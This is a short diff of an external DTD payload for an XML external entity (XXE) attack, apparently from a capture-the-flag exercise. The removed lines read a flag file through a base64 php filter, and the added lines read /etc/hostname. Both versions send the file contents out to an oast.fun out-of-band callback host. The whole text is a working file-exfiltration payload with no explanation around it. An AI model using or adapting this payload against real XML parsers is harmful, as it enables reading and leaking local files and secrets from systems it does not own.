@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag.txt">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://uaoetzvavoopuntbmsppj31hgd3cn64uo.oast.fun/exfil?x=%data;'>">
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://uaoetzvavoopuntbmsppj31hgd3cn64uo.oast.fun/%file;'>">
